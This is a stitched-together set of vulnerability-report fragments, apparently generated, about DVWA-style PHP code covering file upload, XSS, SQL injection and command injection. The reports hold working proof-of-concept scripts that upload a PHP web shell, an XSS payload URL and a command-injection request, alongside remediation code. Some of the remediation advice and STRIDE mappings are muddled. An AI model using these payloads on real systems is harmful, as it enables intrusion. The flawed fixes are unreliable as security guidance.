It checks the security level set by the user and includes a corresponding PHP file that contains the logic for the file upload. It also checks if the folder is writable and if the PHP-GD module is installed. \nIssue: The main issue with this code is that it allows for unrestricted file uploads, which can lead to various attacks such as remote code execution, denial of service, and malware distribution. The code does not properly validate the file type or content, allowing for malicious files to be uploaded. Additionally, the code does not properly handle file names, which can lead to directory traversal attacks. \nThreat Model: This vulnerability can be described using the STRIDE methodology. The threat is Spoofing, as an attacker can upload a malicious file that can impersonate a legitimate file. The attacker can also Tamper with the file by modifying its content or name. The attacker can also perform a Repudiation attack by denying that they uploaded the malicious file. The attacker can also perform an Information Disclosure attack by uploading a file that contains sensitive information. The attacker can also perform a Denial of Service attack by uploading a large file that can consume server resources. Finally, the attacker can perform an Elevation of Privilege attack by uploading a file that can grant them elevated privileges on the server. \nProof of Concept: To test this vulnerability, an attacker can create a malicious file with a PHP shell payload and upload it using the file upload form. The following Python script can be used to automate the attack:\n\n```\nimport requests\n\nurl = \"http://example.com/vulnerabilities/upload/\"\nfiles = {'uploaded': ('shell.php', '<?php system($_GET[\"cmd\"]); ?>', 'text/plain')}\ndata = {'MAX_FILE_SIZE': '100000', 'Upload': 'Upload'}\n\nresponse = requests.post(url, files=files, data=data)\n\nif response.status_code == 200:\n    print(\"File uploaded successfully\")\nelse:\n    print(\"File upload failed\")\n```\n\nTaint Analysis: The exploit is accessible by sending a GET request to the uploaded file with the \"cmd\" parameter set to the desired shell command. For example, if the uploaded file is located at \"http://example.com/uploads/shell.php\", the attacker can execute the \"ls\" command by accessing \"http://example.com/uploads/shell.php?cmd=ls\". \n\nRecommendation: To remediate this vulnerability, the code should properly validate the file type and content before allowing the upload. This can be done by checking the file extension and MIME type against a whitelist of allowed types. The code should also properly handle file names by sanitizing them and preventing directory traversal attacks. Additionally, the code should limit the file size and perform virus scans on the uploaded files. The following code shows an example of how to validate the file type and content:\n\n```\n$allowed_types = array('image/jpeg', 'image/png', 'image/gif');\n$file_type = $_FILES['uploaded']['type'];\n$file_content = file_get_contents($_FILES['uploaded']['tmp_name']);\n\nif (!in_array($file_type, $allowed_types)) {\n    die(\"Invalid file type\");\n}\n\nif (strpos($file_content, '<?php') !== false) {\n    die(\"Invalid file content\");\n}\n```\n\nTaxonomy: This vulnerability can be classified as CWE-434 (Unrestricted Upload of File with Dangerous Type) and CAPEC-666 (Upload of Unexpected File Type). \n\nCVSS Score: The CVSS3.1 score for this vulnerability is 9.8 (Critical) with the following vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H."}

An attacker can upload a malicious file with a PHP shell payload and execute arbitrary code on the server. \nThreat Model: The vulnerability can be described using the STRIDE methodology as follows:\n- Spoofing: An attacker can upload a file with a spoofed extension to bypass the file type check.\n- Tampering: An attacker can modify the contents of the uploaded file to include malicious code.\n- Repudiation: An attacker can deny uploading a malicious file by spoofing the IP address or using a proxy.\n- Information Disclosure: An attacker can upload a file with sensitive information and access it later.\n- Denial of Service: An attacker can upload a large file to exhaust the server's resources.\n- Elevation of Privilege: An attacker can upload a file to gain access to sensitive files or directories on the server.\nProof of Concept: To test the vulnerability, an attacker can create a PHP shell payload and rename it with a spoofed extension such as \".jpg\". The attacker can then upload the file using the vulnerable script. Once the file is uploaded, the attacker can access the shell by visiting the uploaded file's URL. A bash script to test the vulnerability is as follows:\n\n```\n#!/bin/bash\n\n# Create a PHP shell payload\necho '<?php system($_GET[\"cmd\"]); ?>' > shell.php\n\n# Rename the payload with a spoofed extension\nmv shell.php shell.jpg\n\n# Upload the file to the target server\ncurl -F \"uploaded=@shell.jpg\" http://target.com/upload.php\n\n# Access the shell\ncurl http://target.com/hackable/uploads/shell.jpg?cmd=whoami\n```\n\nTaint Analysis: The vulnerability is accessible by uploading a file with a spoofed extension and a PHP shell payload. The uploaded file is then moved to the \"hackable/uploads/\" directory, which can be accessed by anyone with the URL. The PHP shell payload can be executed by visiting the uploaded file's URL with a command parameter.\n\nRecommendation: To remediate the vulnerability, the code should perform additional checks on the uploaded file such as checking the file's contents, using a whitelist of allowed file types, and limiting the file size.

If it does, the script redirects the user to the same page with the 'default' parameter set to 'English' and exits the script.\n\nIssue: The code is vulnerable to Cross-Site Scripting (XSS) attacks.

An attacker can exploit this vulnerability to steal sensitive information, such as session cookies, or to perform actions on behalf of the victim, such as changing their account settings or making unauthorized transactions.\n\nProof of Concept: To test the vulnerability, an attacker can craft a malicious URL that includes a script tag with a JavaScript payload. For example, the following URL can be used:\n\nhttp://example.com/?default=<script>alert('XSS')</script>\n\nThis will trigger the XSS vulnerability and execute the JavaScript payload.\n\nTo demonstrate the vulnerability, a Python script can be used to send a GET request with the malicious URL and check if the payload is executed:\n\n```\nimport requests\n\nurl = 'http://example.com/?default=<script>alert(\"XSS\")</script>'\nresponse = requests.get(url)\n\nif '<script>alert(\"XSS\")</script>' in response.text:\n    print('Vulnerable to XSS')\nelse:\n    print('Not vulnerable to XSS')\n```\n\nTaint Analysis: The vulnerability can be exploited by injecting malicious code into the $default variable, which is then echoed back to the user in the redirect URL. The tainted input is not properly sanitized or validated, allowing an attacker to inject arbitrary HTML or JavaScript code.\n\nRecommendation: To fix the vulnerability, the script should properly sanitize and validate the input before using it in the redirect URL. One way to do this is to use the htmlspecialchars() function to encode any special characters in the $default variable. For example, the following code can be used:\n\n```\nif ( array_key_exists( \"default\", $_GET ) && !is_null ($_GET[ 'default' ]) ) {\n    $default = $_GET['default'];\n    \n    # Sanitize input\n    $default = htmlspecialchars($default, ENT_QUOTES, 'UTF-8');\n    \n    # Do not allow script tags\n    if (stripos ($default, \"<script\") !== false) {\n        header (\"location: ?default=English\");\n        exit;\n    }\n}\n```\n\nThis code uses the htmlspecialchars() function to encode any special characters in the $default variable, such as < and >, to their corresponding HTML entities. This prevents the browser from interpreting them as HTML tags or JavaScript code.\n\nTaxonomy: The vulnerability can be classified as CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') and CAPEC-86: Cross-site Scripting (XSS). \n\nCVSS Score: The CVSS3.1 score for this vulnerability is 6.1 (Medium).

An attacker can still inject malicious SQL code into the query by using special characters like quotes or semicolons.\nThreat Model: This vulnerability can be exploited using the Injection technique of the STRIDE methodology.\nProof of Concept: An attacker can exploit this vulnerability by submitting a message input that contains a SQL injection payload.

Here is an example of how the code can be fixed using prepared statements:\n```\nif( isset( $_POST[ 'btnSign' ] ) ) {\n    // Get input\n    $message = trim( $_POST[ 'mtxMessage' ] );\n    $name    = trim( $_POST[ 'txtName' ] );\n\n    // Sanitize message input\n    $message = strip_tags( addslashes( $message ) );\n    $message = htmlspecialchars( $message );\n\n    // Sanitize name input\n    $name = str_replace( '<script>', '', $name );\n\n    // Update database using prepared statement\n    $stmt = $mysqli->prepare(\"INSERT INTO guestbook ( comment, name ) VALUES (?, ?)\");\n    $stmt->bind_param(\"ss\", $message, $name);\n    $stmt->execute();\n}\n```\nThis code uses a prepared statement to insert the user input into the database. The input is passed as parameters to the statement, which ensures that it is properly sanitized and prevents SQL injection attacks.\nTaxonomy: This vulnerability can be classified as CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') and CAPEC-66: SQL Injection. \nCVSS Score: The CVSS3.1 score for this vulnerability is 7.5 (High) with the following vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N."}

The script uses a blacklist array to remove certain characters from the input before executing the command.\nIssue: The script is vulnerable to command injection attacks. An attacker can bypass the blacklist by using different variations of the characters or by using other characters that are not in the blacklist. This can allow the attacker to execute arbitrary commands on the server.\nThreat Model: The vulnerability can be described using the STRIDE methodology. The attacker can exploit this vulnerability to gain unauthorized access to the server or to execute malicious code on the server. This can lead to data theft, data loss, or system compromise.\nProof of Concept: To test the vulnerability, an attacker can submit the following input as the IP address: `127.0.0.1; ls`. This will execute the `ls` command on the server and list the contents of the current directory. A bash script to test the vulnerability is as follows:\n\n```\n#!/bin/bash\n\ncurl -X POST \\\n  http://example.com/script.php \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  -d 'ip=127.0.0.1%3B%20ls&Submit=Submit'\n```\n\nTaint Analysis: The input is tainted because it is not properly sanitized before being used in a shell command. The blacklist array is not sufficient to prevent command injection attacks.\nRecommendation: To remediate the vulnerability, the input should be properly sanitized using a whitelist approach. Only allow input that matches a specific pattern, such as an IP address. The shell_exec() function should also be avoided if possible, as it is prone to command injection attacks. Instead, use a safer alternative such as the exec() function with proper arguments. The remediated code is as follows:\n\n```\n<?php\n\nif( isset( $_POST[ 'Submit' ]  ) ) {\n\t// Get input\n\t$target = trim($_REQUEST[ 'ip' ]);\n\n\t// Validate input\n\tif (filter_var($target, FILTER_VALIDATE_IP)) {\n\t\t// Execute the ping command.\n\t\tif( stristr( php_uname( 's' ), 'Windows NT' ) ) {\n\t\t\t// Windows\n\t\t\t$cmd = exec( 'ping ' . escapeshellarg($target) );\n\t\t}\n\t\telse {\n\t\t\t// *nix\n\t\t\t$cmd = exec( 'ping -c 4 ' . escapeshellarg($target) );\n\t\t}\n\n\t\t// Feedback for the end user\n\t\t$html .= \"<pre>{$cmd}</pre>\";\n\t} else {\n\t\t$html .= \"<pre>Invalid input</pre>\";\n\t}\n}\n\n?>\n```\n\nTaxonomy: The vulnerability can be classified as CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') and CAPEC-88: Command Injection. \nCVSS Score: The CVSS3.1 score for this vulnerability is 8.8 (High)."}
